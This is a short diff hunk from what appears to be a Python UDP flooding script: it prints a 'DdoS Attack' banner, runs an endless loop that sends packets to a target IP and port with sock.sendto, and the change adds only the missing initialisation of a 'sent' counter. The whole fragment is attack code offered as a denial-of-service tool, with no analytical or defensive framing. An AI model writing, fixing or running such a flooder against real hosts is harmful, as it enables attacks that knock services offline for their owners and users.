@@ -29,6 +29,8 @@ os.system("clear")
 print("\033[93m")
 os.system("figlet DdoS Attack")
 
+sent = 0
+
 while True:
    sock.sendto(bytes, (ip,port))
    sent = sent + 1
